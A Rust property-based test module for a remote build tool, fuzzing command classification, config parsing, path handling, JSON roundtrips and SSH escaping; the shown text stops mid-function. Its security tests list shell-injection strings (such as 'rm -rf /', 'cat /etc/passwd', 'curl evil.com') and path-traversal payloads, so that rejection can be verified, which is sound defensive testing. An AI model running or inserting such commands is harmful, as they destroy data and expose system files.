//! Property-based tests using proptest for fuzzing and invariant verification.
//!
//! This module provides comprehensive property testing for critical RCH components:
//! - Command classification (patterns.rs)
//! - Config parsing (TOML handling)
//! - Path handling (no traversal vulnerabilities)
//!
//! All proptest runs are logged for auditing as per bead requirements.

#[cfg(test)]
mod tests {
    use crate::patterns::{
        CompilationKind, TierDecision, classify_command, classify_command_detailed,
        normalize_command,
    };
    use proptest::prelude::*;
    use std::path::PathBuf;
    use tracing::info;

    /// Safely truncate a string to at most `max_bytes` bytes, ensuring we don't
    /// split in the middle of a multi-byte UTF-8 character.
    fn safe_truncate(s: &str, max_bytes: usize) -> &str {
        if s.len() <= max_bytes {
            return s;
        }
        // Find the last char boundary at or before max_bytes
        let mut end = max_bytes;
        while end > 0 && !s.is_char_boundary(end) {
            end -= 1;
        }
        &s[..end]
    }

    // ============================================================================
    // Classification Fuzzing Tests
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(10000))]

        /// Property: classify_command never panics on arbitrary input.
        /// This tests the robustness of the classification pipeline.
        #[test]
        fn classification_never_panics(command in ".*") {
            // Log the test case for auditing
            info!(target: "proptest::classification", "Testing command: {:?}", command);

            // Should never panic, regardless of input
            let result = classify_command(&command);

            // Invariant: confidence is always in valid range
            prop_assert!(result.confidence >= 0.0, "Confidence {} below 0", result.confidence);
            prop_assert!(result.confidence <= 1.0, "Confidence {} above 1", result.confidence);

            // Invariant: if is_compilation, must have a kind; if not, kind must be None
            if result.is_compilation {
                prop_assert!(result.kind.is_some(), "Compilation without kind");
            } else {
                prop_assert!(result.kind.is_none(), "Non-compilation with kind: {:?}", result.kind);
            }

            // Invariant: reason is never empty
            prop_assert!(!result.reason.is_empty(), "Empty reason");
        }

        /// Property: classify_command_detailed never panics and produces consistent results.
        #[test]
        fn detailed_classification_consistency(command in ".*") {
            info!(target: "proptest::classification", "Testing detailed: {:?}", command);

            // Get both simple and detailed classification
            let simple = classify_command(&command);
            let detailed = classify_command_detailed(&command);

            // Invariant: detailed classification matches simple classification
            prop_assert_eq!(
                simple.is_compilation,
                detailed.classification.is_compilation,
                "Classification mismatch for {:?}",
                command
            );
            prop_assert_eq!(simple.kind, detailed.classification.kind);
            prop_assert_eq!(simple.confidence, detailed.classification.confidence);

            // Invariant: tiers are non-empty
            prop_assert!(!detailed.tiers.is_empty(), "No tiers produced");

            // Invariant: tier numbers are sequential starting from 0
            for (i, tier) in detailed.tiers.iter().enumerate() {
                prop_assert_eq!(tier.tier as usize, i, "Non-sequential tier number");
            }
        }

        /// Property: normalize_command never panics on arbitrary input.
        #[test]
        fn normalize_never_panics(command in ".*") {
            info!(target: "proptest::normalize", "Normalizing: {:?}", command);

            let normalized = normalize_command(&command);

            // Invariant: normalized result is never longer than original (plus some buffer for edge cases)
            // Note: this might not always hold due to path expansion, so we just check it doesn't panic
            prop_assert!(normalized.len() <= command.len() + 100,
                "Normalized {:?} much longer than original {:?}",
                normalized, command);
        }

        /// Property: commands with shell metacharacters are not classified as compilation.
        #[test]
        fn shell_injection_rejected(
            prefix in "(cargo build|gcc -c|make|rustc) ",
            injection in prop::sample::select(vec![
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& curl evil.com",
                "|| wget malware",
                "$(whoami)",
                "`id`",
                "> /etc/passwd",
            ])
        ) {
            let malicious = format!("{}{}", prefix, injection);
            info!(target: "proptest::security", "Testing injection: {:?}", malicious);

            let result = classify_command(&malicious);

            // Invariant: commands with shell metacharacters must not be compilation
            prop_assert!(
                !result.is_compilation,
                "Potential shell injection accepted: {} -> {:?}",
                malicious,
                result
            );
        }
    }

    // ============================================================================
    // Config Parsing Fuzzing Tests
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(10000))]

        /// Property: TOML parsing never panics on arbitrary input.
        #[test]
        fn toml_parsing_never_panics(content in ".*") {
            info!(target: "proptest::config", "Parsing TOML: {:?}", safe_truncate(&content, 100));

            // Parse as generic TOML value - should never panic
            let result: Result<toml::Value, _> = toml::from_str(&content);

            // We don't care if it succeeds or fails, just that it doesn't panic
            match result {
                Ok(_) => info!(target: "proptest::config", "Valid TOML"),
                Err(e) => info!(target: "proptest::config", "Invalid TOML: {}", e),
            }
        }

        /// Property: Structured config parsing never panics.
        #[test]
        fn config_struct_parsing_never_panics(content in ".*") {
            use serde::Deserialize;

            // Test parsing into a config-like structure
            #[derive(Debug, Deserialize)]
            #[allow(dead_code)]
            struct TestConfig {
                settings: Option<TestSettings>,
                workers: Option<Vec<TestWorker>>,
            }

            #[derive(Debug, Deserialize)]
            #[allow(dead_code)]
            struct TestSettings {
                timeout_secs: Option<u64>,
                remote_dir: Option<String>,
            }

            #[derive(Debug, Deserialize)]
            #[allow(dead_code)]
            struct TestWorker {
                id: Option<String>,
                host: Option<String>,
                enabled: Option<bool>,
            }

            info!(target: "proptest::config", "Parsing config struct: {:?}", safe_truncate(&content, 50));

            // Should never panic
            let _result: Result<TestConfig, _> = toml::from_str(&content);
        }

        /// Property: .env file parsing never panics.
        #[test]
        fn dotenv_parsing_never_panics(content in ".*") {
            info!(target: "proptest::dotenv", "Parsing dotenv: {:?}", safe_truncate(&content, 50));

            // Simulate .env parsing logic from config/dotenv.rs
            let mut vars = Vec::new();
            for line in content.lines() {
                let line = line.trim();
                if line.is_empty() || line.starts_with('#') {
                    continue;
                }
                if let Some((key, value)) = line.split_once('=') {
                    let key = key.trim().to_string();
                    let value = value.trim();
                    let value = if (value.starts_with('"') && value.ends_with('"'))
                        || (value.starts_with('\'') && value.ends_with('\''))
                    {
                        if value.len() >= 2 {
                            value[1..value.len() - 1].to_string()
                        } else {
                            String::new()
                        }
                    } else {
                        value.split('#').next().unwrap_or("").trim().to_string()
                    };
                    if !key.is_empty() {
                        vars.push((key, value));
                    }
                }
            }
            // Just verifying it doesn't panic
            prop_assert!(vars.len() <= content.lines().count() + 1);
        }
    }

    // ============================================================================
    // Path Handling Security Tests
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(5000))]

        /// Property: Path normalization doesn't allow directory traversal.
        #[test]
        fn no_path_traversal(
            base in "[a-zA-Z0-9_/]{1,50}",
            traversal in prop::sample::select(vec![
                "../",
                "..\\",
                "/..",
                "\\..",
                "....//",
                "%2e%2e/",
                "%2e%2e%2f",
                "..%c0%af",
                "..%252f",
            ])
        ) {
            let malicious_path = format!("{}{}", base, traversal);
            info!(target: "proptest::path", "Testing path: {:?}", malicious_path);

            // Use std::path for canonicalization check
            let path = PathBuf::from(&malicious_path);

            // Simulate the expand_tilde function logic
            let expanded = if let Some(stripped) = malicious_path.strip_prefix("~/") {
                if let Some(home) = dirs::home_dir() {
                    home.join(stripped).display().to_string()
                } else {
                    malicious_path.clone()
                }
            } else {
                malicious_path.clone()
            };

            // Invariant: expanded path should not escape intended directory
            // (Note: this is a basic check; real security requires more careful handling)
            if expanded.contains("..") {
                info!(target: "proptest::path", "Path contains traversal: {:?}", expanded);
            }

            // Just ensure we don't panic during path operations
            let _ = path.components().count();
            let _ = path.file_name();
            let _ = path.parent();
        }

        /// Property: SSH config identity file paths are properly expanded.
        #[test]
        fn identity_file_expansion_safe(path in "[~./a-zA-Z0-9_/-]{0,100}") {
            info!(target: "proptest::path", "Expanding identity: {:?}", path);

            // Simulate expand_tilde from discovery.rs
            let expanded = if let Some(rest) = path.strip_prefix("~/") {
                if let Some(home) = dirs::home_dir() {
                    // Strip leading slashes to prevent PathBuf::join from treating
                    // rest as absolute and ignoring the home directory
                    let rest = rest.trim_start_matches('/');
                    home.join(rest).display().to_string()
                } else {
                    path.clone()
                }
            } else {
                path.clone()
            };

            // Invariant: expansion should never produce paths outside home for ~/ paths
            if path.starts_with("~/")
                && let Some(home) = dirs::home_dir()
            {
                let home_str = home.display().to_string();
                prop_assert!(
                    expanded.starts_with(&home_str) || expanded == path,
                    "Path escaped home: {} -> {}",
                    path,
                    expanded
                );
            }
        }
    }

    // ============================================================================
    // Version String Invariants
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(3000))]

        /// Property: Version string parsing follows expected patterns.
        /// Tests that version strings like "rustc 1.76.0" can be processed safely.
        #[test]
        fn version_string_parsing(
            prefix in "(rustc|bun|node|npm|gcc|clang) ",
            version in "[0-9]{1,3}\\.[0-9]{1,3}(\\.[0-9]{1,3})?(-[a-zA-Z0-9]+)?"
        ) {
            let version_str = format!("{}{}", prefix, version);
            info!(target: "proptest::version", "Testing version: {:?}", version_str);

            // Extract version number (simulate common parsing pattern)
            let parts: Vec<&str> = version_str.split_whitespace().collect();
            if parts.len() >= 2 {
                let ver = parts[1];
                // Parse major.minor.patch
                let nums: Vec<&str> = ver.split(['.', '-']).collect();
                prop_assert!(!nums.is_empty(), "No version numbers found");

                // First component should be numeric
                if let Some(major) = nums.first() {
                    let _ = major.parse::<u32>(); // Should not panic
                }
            }
        }

        /// Property: Semver-like comparison transitivity.
        /// If a <= b and b <= c, then a <= c.
        #[test]
        fn version_transitivity(
            a_major in 0u32..100,
            a_minor in 0u32..100,
            a_patch in 0u32..100,
            b_major in 0u32..100,
            b_minor in 0u32..100,
            b_patch in 0u32..100,
            c_major in 0u32..100,
            c_minor in 0u32..100,
            c_patch in 0u32..100,
        ) {
            let a = (a_major, a_minor, a_patch);
            let b = (b_major, b_minor, b_patch);
            let c = (c_major, c_minor, c_patch);

            info!(target: "proptest::version", "Transitivity: {:?} vs {:?} vs {:?}", a, b, c);

            // Test transitivity using tuple comparison (which Rust guarantees)
            if a <= b && b <= c {
                prop_assert!(a <= c, "Transitivity violated: {:?} <= {:?} <= {:?} but {:?} > {:?}", a, b, c, a, c);
            }

            // Also test version string formatting doesn't panic
            let _ = format!("{}.{}.{}", a_major, a_minor, a_patch);
        }
    }

    // ============================================================================
    // Additional Robustness Tests
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(5000))]

        /// Property: Unicode handling in commands doesn't cause panics.
        #[test]
        fn unicode_command_handling(command in "\\PC*") {
            info!(target: "proptest::unicode", "Unicode command: {:?}", safe_truncate(&command, 50));

            // Should handle any valid Unicode string
            let result = classify_command(&command);
            prop_assert!(result.confidence >= 0.0);
            prop_assert!(result.confidence <= 1.0);
        }

        /// Property: Very long commands don't cause stack overflow or excessive memory use.
        #[test]
        fn long_command_handling(
            prefix in "(cargo build|gcc|make) ",
            repeat_count in 1usize..1000,
        ) {
            let long_arg = " --flag=value".repeat(repeat_count);
            let command = format!("{}{}", prefix, long_arg);

            info!(target: "proptest::stress", "Long command length: {}", command.len());

            // Should handle without stack overflow
            let result = classify_command(&command);

            // Long commands with many flags should still classify correctly or reject cleanly
            prop_assert!(result.confidence >= 0.0);
            prop_assert!(result.confidence <= 1.0);
        }

        /// Property: Commands with null bytes are handled safely.
        #[test]
        fn null_byte_handling(prefix in "cargo build", has_null in any::<bool>()) {
            let command = if has_null {
                format!("{}\0--release", prefix)
            } else {
                format!("{} --release", prefix)
            };

            info!(target: "proptest::special", "Null byte test: has_null={}", has_null);

            // Should not panic
            let result = classify_command(&command);

            // Commands with null bytes should probably be rejected, but at minimum shouldn't panic
            prop_assert!(result.confidence >= 0.0);
        }

        /// Property: Whitespace-only commands are handled correctly.
        #[test]
        fn whitespace_handling(whitespace in "[ \\t\\n\\r]*") {
            info!(target: "proptest::whitespace", "Whitespace-only command");

            let result = classify_command(&whitespace);

            // Whitespace-only should not be compilation
            prop_assert!(!result.is_compilation, "Whitespace classified as compilation");
            prop_assert_eq!(result.confidence, 0.0);
        }
    }

    // ============================================================================
    // Non-proptest Regression Tests
    // ============================================================================

    #[test]
    fn regression_empty_string() {
        let result = classify_command("");
        assert!(!result.is_compilation);
        assert_eq!(result.confidence, 0.0);
        assert!(result.reason.contains("empty"));
    }

    #[test]
    fn regression_cargo_build_valid() {
        let result = classify_command("cargo build --release");
        assert!(result.is_compilation);
        assert_eq!(result.kind, Some(CompilationKind::CargoBuild));
        assert!(result.confidence >= 0.9);
    }

    #[test]
    fn regression_injection_semicolon() {
        let result = classify_command("cargo build; rm -rf /");
        assert!(!result.is_compilation);
        assert!(result.reason.contains("chained"));
    }

    #[test]
    fn regression_injection_pipe() {
        let result = classify_command("cargo build | tee log.txt");
        assert!(!result.is_compilation);
        assert!(result.reason.contains("piped"));
    }

    #[test]
    fn regression_injection_background() {
        let result = classify_command("cargo build &");
        assert!(!result.is_compilation);
        assert!(result.reason.contains("background"));
    }

    #[test]
    fn regression_classification_detailed_tiers() {
        let detailed = classify_command_detailed("cargo build");
        assert!(detailed.classification.is_compilation);
        assert!(!detailed.tiers.is_empty());

        // Should pass all tiers for a valid cargo build
        let final_tier = detailed.tiers.last().unwrap();
        assert_eq!(final_tier.decision, TierDecision::Pass);
    }

    // ============================================================================
    // JSON Serialization Roundtrip Tests (bd-296n)
    // ============================================================================
    //
    // These tests verify that types can be serialized to JSON and deserialized
    // back to equal values. This ensures:
    // 1. Serialize/Deserialize implementations are consistent
    // 2. No data loss during serialization
    // 3. serde attributes work correctly (skip_serializing_if, default, rename_all)

    mod json_roundtrip {
        use super::*;
        use crate::{
            CircuitState, CommandPriority, RequiredRuntime, WorkerCapabilities, WorkerConfig,
            WorkerId, WorkerStatus,
        };
        #[allow(unused_imports)]
        use serde::{Deserialize, Serialize};

        // ---- Arbitrary implementations for types ----

        /// Strategy for generating arbitrary WorkerIds.
        fn arb_worker_id() -> impl Strategy<Value = WorkerId> {
            "[a-zA-Z0-9_-]{1,50}".prop_map(WorkerId::new)
        }

        /// Strategy for generating arbitrary WorkerStatus values.
        fn arb_worker_status() -> impl Strategy<Value = WorkerStatus> {
            prop_oneof![
                Just(WorkerStatus::Healthy),
                Just(WorkerStatus::Degraded),
                Just(WorkerStatus::Unreachable),
                Just(WorkerStatus::Draining),
                Just(WorkerStatus::Disabled),
            ]
        }

        /// Strategy for generating arbitrary CircuitState values.
        fn arb_circuit_state() -> impl Strategy<Value = CircuitState> {
            prop_oneof![
                Just(CircuitState::Closed),
                Just(CircuitState::Open),
                Just(CircuitState::HalfOpen),
            ]
        }

        /// Strategy for generating arbitrary RequiredRuntime values.
        fn arb_required_runtime() -> impl Strategy<Value = RequiredRuntime> {
            prop_oneof![
                Just(RequiredRuntime::None),
                Just(RequiredRuntime::Rust),
                Just(RequiredRuntime::Bun),
                Just(RequiredRuntime::Node),
            ]
        }

        /// Strategy for generating arbitrary CommandPriority values.
        fn arb_command_priority() -> impl Strategy<Value = CommandPriority> {
            prop_oneof![
                Just(CommandPriority::Low),
                Just(CommandPriority::Normal),
                Just(CommandPriority::High),
            ]
        }

        /// Strategy for generating arbitrary WorkerCapabilities.
        fn arb_worker_capabilities() -> impl Strategy<Value = WorkerCapabilities> {
            (
                proptest::option::of("[0-9]+\\.[0-9]+\\.[0-9]+(-[a-zA-Z0-9]+)?"),
                proptest::option::of("[0-9]+\\.[0-9]+\\.[0-9]+"),
                proptest::option::of("v[0-9]+\\.[0-9]+\\.[0-9]+"),
                proptest::option::of("[0-9]+\\.[0-9]+\\.[0-9]+"),
                proptest::option::of(1u32..128u32),
                proptest::option::of(0.0f64..100.0f64),
                proptest::option::of(0.0f64..100.0f64),
                proptest::option::of(0.0f64..100.0f64),
                proptest::option::of(0.0f64..10000.0f64),
                proptest::option::of(0.0f64..10000.0f64),
            )
                .prop_map(
                    |(
                        rustc_version,
                        bun_version,
                        node_version,
                        npm_version,
                        num_cpus,
                        load_avg_1,
                        load_avg_5,
                        load_avg_15,
                        disk_free_gb,
                        disk_total_gb,
                    )| {
                        WorkerCapabilities {
                            rustc_version,
                            bun_version,
                            node_version,
                            npm_version,
                            num_cpus,
                            load_avg_1,
                            load_avg_5,
                            load_avg_15,
                            disk_free_gb,
                            disk_total_gb,
                        }
                    },
                )
        }

        /// Strategy for generating arbitrary WorkerConfig.
        fn arb_worker_config() -> impl Strategy<Value = WorkerConfig> {
            (
                arb_worker_id(),
                "[a-zA-Z0-9.-]{1,50}",
                "[a-zA-Z0-9_]{1,20}",
                "[~/a-zA-Z0-9._/-]{1,100}",
                1u32..64u32,
                1u32..1000u32,
                proptest::collection::vec("[a-zA-Z0-9_-]{1,20}", 0..5),
            )
                .prop_map(
                    |(id, host, user, identity_file, total_slots, priority, tags)| WorkerConfig {
                        id,
                        host,
                        user,
                        identity_file,
                        total_slots,
                        priority,
                        tags,
                    },
                )
        }

        // ---- Roundtrip test helper ----

        /// Helper function to test JSON roundtrip for any type.
        fn assert_json_roundtrip<T>(value: &T) -> Result<(), TestCaseError>
        where
            T: Serialize + for<'de> Deserialize<'de> + std::fmt::Debug + PartialEq,
        {
            let json = serde_json::to_string(value)
                .map_err(|e| TestCaseError::fail(format!("Serialization failed: {}", e)))?;

            let deserialized: T = serde_json::from_str(&json)
                .map_err(|e| TestCaseError::fail(format!("Deserialization failed: {}", e)))?;

            prop_assert_eq!(
                value,
                &deserialized,
                "Roundtrip mismatch for JSON: {}",
                json
            );
            Ok(())
        }

        /// Helper for types that don't implement PartialEq - just verify no panic.
        fn assert_json_roundtrip_no_eq<T>(value: &T) -> Result<(), TestCaseError>
        where
            T: Serialize + for<'de> Deserialize<'de> + std::fmt::Debug,
        {
            let json = serde_json::to_string(value)
                .map_err(|e| TestCaseError::fail(format!("Serialization failed: {}", e)))?;

            let _deserialized: T = serde_json::from_str(&json)
                .map_err(|e| TestCaseError::fail(format!("Deserialization failed: {}", e)))?;

            Ok(())
        }

        // ---- Proptest roundtrip tests ----

        proptest! {
            #![proptest_config(ProptestConfig::with_cases(1000))]

            /// WorkerId JSON roundtrip.
            #[test]
            fn roundtrip_worker_id(id in arb_worker_id()) {
                info!(target: "proptest::json", "Testing WorkerId roundtrip: {:?}", id);
                assert_json_roundtrip(&id)?;
            }

            /// WorkerStatus JSON roundtrip.
            #[test]
            fn roundtrip_worker_status(status in arb_worker_status()) {
                info!(target: "proptest::json", "Testing WorkerStatus roundtrip: {:?}", status);
                assert_json_roundtrip(&status)?;
            }

            /// CircuitState JSON roundtrip.
            #[test]
            fn roundtrip_circuit_state(state in arb_circuit_state()) {
                info!(target: "proptest::json", "Testing CircuitState roundtrip: {:?}", state);
                assert_json_roundtrip(&state)?;
            }

            /// RequiredRuntime JSON roundtrip.
            #[test]
            fn roundtrip_required_runtime(runtime in arb_required_runtime()) {
                info!(target: "proptest::json", "Testing RequiredRuntime roundtrip: {:?}", runtime);
                assert_json_roundtrip(&runtime)?;
            }

            /// CommandPriority JSON roundtrip.
            #[test]
            fn roundtrip_command_priority(priority in arb_command_priority()) {
                info!(target: "proptest::json", "Testing CommandPriority roundtrip: {:?}", priority);
                assert_json_roundtrip(&priority)?;
            }

            /// WorkerCapabilities JSON roundtrip.
            #[test]
            fn roundtrip_worker_capabilities(caps in arb_worker_capabilities()) {
                info!(target: "proptest::json", "Testing WorkerCapabilities roundtrip");
                assert_json_roundtrip_no_eq(&caps)?;
            }

            /// WorkerConfig JSON roundtrip.
            #[test]
            fn roundtrip_worker_config(config in arb_worker_config()) {
                info!(target: "proptest::json", "Testing WorkerConfig roundtrip: {:?}", config.id);
                assert_json_roundtrip_no_eq(&config)?;
            }
        }

        proptest! {
            #![proptest_config(ProptestConfig::with_cases(500))]

            /// Test that JSON with extra fields is handled gracefully (forward compatibility).
            #[test]
            fn extra_fields_ignored_worker_status(status in arb_worker_status()) {
                let json = serde_json::to_string(&status).unwrap();
                // Parse as Value, add extra field, serialize back
                let mut value: serde_json::Value = serde_json::from_str(&json).unwrap();
                if let serde_json::Value::String(_) = &value {
                    // Enums serialize as strings, can't add fields
                } else if let Some(obj) = value.as_object_mut() {
                    obj.insert("extra_field".to_string(), serde_json::Value::Bool(true));
                }
                // Should still parse
                let _result: Result<WorkerStatus, _> = serde_json::from_value(value);
            }

            /// Test default values are applied when fields are missing.
            #[test]
            fn missing_fields_use_defaults_worker_config(
                id in "[a-zA-Z0-9_-]{1,20}",
                host in "[a-zA-Z0-9.-]{1,30}",
                user in "[a-zA-Z0-9_]{1,10}",
                identity_file in "[~/a-zA-Z0-9._/-]{1,50}",
                total_slots in 1u32..32u32,
            ) {
                // Create minimal JSON without optional fields
                let json = format!(
                    r#"{{
                        "id": "{}",
                        "host": "{}",
                        "user": "{}",
                        "identity_file": "{}",
                        "total_slots": {}
                    }}"#,
                    id, host, user, identity_file, total_slots
                );

                let config: WorkerConfig = serde_json::from_str(&json)
                    .expect("Should parse with defaults");

                // Verify defaults are applied
                prop_assert_eq!(config.priority, 100, "Default priority should be 100");
                prop_assert!(config.tags.is_empty(), "Default tags should be empty");
            }

            /// Test that WorkerCapabilities with all None fields serializes to minimal JSON.
            #[test]
            fn empty_capabilities_minimal_json(_seed in any::<u64>()) {
                let caps = WorkerCapabilities::default();
                let json = serde_json::to_string(&caps).unwrap();

                // Should be minimal (skip_serializing_if = "Option::is_none" works)
                let value: serde_json::Value = serde_json::from_str(&json).unwrap();
                if let serde_json::Value::Object(map) = value {
                    prop_assert!(
                        map.is_empty() || map.values().all(|v| !v.is_null()),
                        "Should not contain explicit nulls: {:?}",
                        map
                    );
                }
            }
        }

        // ---- Specific edge case tests ----

        #[test]
        fn roundtrip_worker_id_unicode() {
            let id = WorkerId::new("worker-ãñî-日本語");
            let json = serde_json::to_string(&id).unwrap();
            let deserialized: WorkerId = serde_json::from_str(&json).unwrap();
            assert_eq!(id, deserialized);
        }

        #[test]
        fn roundtrip_worker_id_empty_string() {
            let id = WorkerId::new("");
            let json = serde_json::to_string(&id).unwrap();
            let deserialized: WorkerId = serde_json::from_str(&json).unwrap();
            assert_eq!(id, deserialized);
        }

        #[test]
        fn roundtrip_worker_status_all_variants() {
            for status in [
                WorkerStatus::Healthy,
                WorkerStatus::Degraded,
                WorkerStatus::Unreachable,
                WorkerStatus::Draining,
                WorkerStatus::Disabled,
            ] {
                let json = serde_json::to_string(&status).unwrap();
                let deserialized: WorkerStatus = serde_json::from_str(&json).unwrap();
                assert_eq!(status, deserialized);
            }
        }

        #[test]
        fn roundtrip_circuit_state_all_variants() {
            for state in [
                CircuitState::Closed,
                CircuitState::Open,
                CircuitState::HalfOpen,
            ] {
                let json = serde_json::to_string(&state).unwrap();
                let deserialized: CircuitState = serde_json::from_str(&json).unwrap();
                assert_eq!(state, deserialized);
            }
        }

        #[test]
        fn worker_capabilities_float_precision() {
            // Test that f64 values roundtrip correctly
            let caps = WorkerCapabilities {
                load_avg_1: Some(3.14159265358979),
                disk_free_gb: Some(123.456789),
                ..Default::default()
            };

            let json = serde_json::to_string(&caps).unwrap();
            let deserialized: WorkerCapabilities = serde_json::from_str(&json).unwrap();

            // f64 should preserve precision
            assert_eq!(caps.load_avg_1, deserialized.load_avg_1);
            assert_eq!(caps.disk_free_gb, deserialized.disk_free_gb);
        }

        #[test]
        fn worker_config_with_special_characters() {
            let config = WorkerConfig {
                id: WorkerId::new("worker-with-dashes_and_underscores"),
                host: "192.168.1.100".to_string(),
                user: "build_user".to_string(),
                identity_file: "~/.ssh/id_ed25519".to_string(),
                total_slots: 16,
                priority: 200,
                tags: vec!["gpu".to_string(), "high-memory".to_string()],
            };

            let json = serde_json::to_string(&config).unwrap();
            let deserialized: WorkerConfig = serde_json::from_str(&json).unwrap();

            assert_eq!(config.id, deserialized.id);
            assert_eq!(config.host, deserialized.host);
            assert_eq!(config.tags, deserialized.tags);
        }

        #[test]
        fn circuit_state_snake_case_serialization() {
            // Verify serde(rename_all = "snake_case") works
            let state = CircuitState::HalfOpen;
            let json = serde_json::to_string(&state).unwrap();
            // Should NOT be "HalfOpen" but "half_open"
            assert!(
                json.contains("half_open") || json == "\"half_open\"",
                "Expected snake_case: {}",
                json
            );
        }
    }

    // ============================================================================
    // SSH Command Escaping Tests (bd-2elj)
    // ============================================================================
    //
    // These tests verify that SSH shell escaping functions are safe against
    // command injection attacks. The functions tested are:
    // - shell_escape_value: escapes values for use in shell commands
    // - is_valid_env_key: validates environment variable key names
    // - build_env_prefix: combines both to build safe env var prefixes

    mod ssh_escaping {
        use super::*;
        use crate::ssh::build_env_prefix;
        use std::collections::HashMap;

        // Re-implement the internal functions for testing since they're private
        // (mirrors the logic in ssh.rs exactly)

        fn is_valid_env_key(key: &str) -> bool {
            let mut chars = key.chars();
            let Some(first) = chars.next() else {
                return false;
            };
            if !(first == '_' || first.is_ascii_alphabetic()) {
                return false;
            }
            chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
        }

        fn shell_escape_value(value: &str) -> Option<String> {
            if value.contains('\n') || value.contains('\r') || value.contains('\0') {
                return None;
            }
            let mut out = String::with_capacity(value.len() + 2);
            out.push('\'');
            for ch in value.chars() {
                if ch == '\'' {
                    out.push_str("'\"'\"'");
                } else {
                    out.push(ch);
                }
            }
            out.push('\'');
            Some(out)
        }

        // ---- Property tests for shell_escape_value ----

        proptest! {
            #![proptest_config(ProptestConfig::with_cases(5000))]

            /// Property: shell_escape_value never panics on arbitrary input.
            #[test]
            fn escape_never_panics(value in ".*") {
                info!(target: "proptest::ssh", "Testing escape for: {:?}", safe_truncate(&value, 50));
                let _ = shell_escape_value(&value);
            }

            /// Property: escaped values start and end with single quotes.
            #[test]
            fn escaped_values_quoted(value in "[^\\n\\r\\x00]*") {
                info!(target: "proptest::ssh", "Testing quoting for: {:?}", safe_truncate(&value, 50));
                if let Some(escaped) = shell_escape_value(&value) {
                    prop_assert!(
                        escaped.starts_with('\''),
                        "Escaped value should start with quote: {:?}",
                        escaped
                    );
                    prop_assert!(
                        escaped.ends_with('\''),
                        "Escaped value should end with quote: {:?}",
                        escaped
                    );
                }
            }

            /// Property: values with newlines are rejected.
            #[test]
            fn newlines_rejected(
                prefix in "[^\\n\\r\\x00]{0,20}",
                suffix in "[^\\n\\r\\x00]{0,20}",
            ) {
                let with_newline = format!("{}\n{}", prefix, suffix);
                let with_cr = format!("{}\r{}", prefix, suffix);

                info!(target: "proptest::ssh", "Testing newline rejection");

                prop_assert!(
                    shell_escape_value(&with_newline).is_none(),
                    "Newline should be rejected"
                );
                prop_assert!(
                    shell_escape_value(&with_cr).is_none(),
                    "Carriage return should be rejected"
                );
            }

            /// Property: values with NUL bytes are rejected.
            #[test]
            fn nul_rejected(
                prefix in "[^\\n\\r\\x00]{0,20}",
                suffix in "[^\\n\\r\\x00]{0,20}",
            ) {
                let with_nul = format!("{}\0{}", prefix, suffix);
                info!(target: "proptest::ssh", "Testing NUL rejection");

                prop_assert!(
                    shell_escape_value(&with_nul).is_none(),
                    "NUL byte should be rejected"
                );
            }

            /// Property: single quotes in values are properly escaped.
            #[test]
            fn quotes_escaped(value in "[^\\n\\r\\x00]*'[^\\n\\r\\x00]*") {
                info!(target: "proptest::ssh", "Testing quote escaping for: {:?}", safe_truncate(&value, 50));

                let escaped = shell_escape_value(&value).expect("Should escape without dangerous chars");

                // The escaped value should contain the quote escape sequence
                prop_assert!(
                    escaped.contains("'\"'\"'"),
                    "Single quotes should be escaped with '\"'\"' pattern: {:?}",
                    escaped
                );
            }

            /// Property: escaped output never contains unescaped single quotes
            /// (except at start/end).
            #[test]
            fn no_unescaped_quotes_in_middle(value in "[^\\n\\r\\x00]{1,100}") {
                info!(target: "proptest::ssh", "Testing no unescaped quotes");

                if let Some(escaped) = shell_escape_value(&value) {
                    // Remove the outer quotes
                    let inner = &escaped[1..escaped.len()-1];

                    // The inner content should not have lone single quotes
                    // Valid patterns are: no quotes, or quotes as part of '\"'\"'
                    // After removing the escape sequence, there should be no quotes left
                    let cleaned = inner.replace("'\"'\"'", "");
                    prop_assert!(
                        !cleaned.contains('\''),
                        "Found unescaped quote in: {:?} (cleaned: {:?})",
                        escaped,
                        cleaned
                    );
                }
            }
        }

        // ---- Property tests for is_valid_env_key ----

        proptest! {
            #![proptest_config(ProptestConfig::with_cases(5000))]

            /// Property: is_valid_env_key never panics on arbitrary input.
            #[test]
            fn key_validation_never_panics(key in ".*") {
                info!(target: "proptest::ssh", "Testing key validation: {:?}", safe_truncate(&key, 50));
                let _ = is_valid_env_key(&key);
            }

            /// Property: valid env keys are accepted.
            #[test]
            fn valid_keys_accepted(key in "[A-Za-z_][A-Za-z0-9_]{0,30}") {
                info!(target: "proptest::ssh", "Testing valid key: {:?}", key);
                prop_assert!(
                    is_valid_env_key(&key),
                    "Valid key should be accepted: {:?}",
                    key
                );
            }

            /// Property: keys starting with digits are rejected.
            #[test]
            fn digit_start_rejected(
                digit in "[0-9]",
                rest in "[A-Za-z0-9_]{0,20}",
            ) {
                let key = format!("{}{}", digit, rest);
                info!(target: "proptest::ssh", "Testing digit-start rejection: {:?}", key);

                prop_assert!(
                    !is_valid_env_key(&key),
                    "Key starting with digit should be rejected: {:?}",
                    key
                );
            }

            /// Property: keys with special characters are rejected.
            #[test]
            fn special_chars_rejected(
                prefix in "[A-Za-z_][A-Za-z0-9_]{0,10}",
                special in prop::sample::select(vec![
                    '=', ' ', '-', '.', '/', '\\', '$', '`', '"', '\'',
                    ';', '|', '&', '(', ')', '<', '>', '*', '?', '[', ']',
                ]),
                suffix in "[A-Za-z0-9_]{0,10}",
            ) {
                let key = format!("{}{}{}", prefix, special, suffix);
                info!(target: "proptest::ssh", "Testing special char rejection: {:?}", key);

                prop_assert!(
                    !is_valid_env_key(&key),
                    "Key with special char '{}' should be rejected: {:?}",
                    special,
                    key
                );
            }

            /// Property: empty keys are rejected.
            #[test]
            fn empty_key_rejected(_seed in any::<u64>()) {
                prop_assert!(
                    !is_valid_env_key(""),
                    "Empty key should be rejected"
                );
            }
        }

        // ---- Property tests for build_env_prefix ----

        proptest! {
            #![proptest_config(ProptestConfig::with_cases(2000))]

            /// Property: build_env_prefix never panics on arbitrary input.
            #[test]
            fn prefix_never_panics(
                keys in proptest::collection::vec(".*", 0..10),
                values in proptest::collection::vec(".*", 0..10),
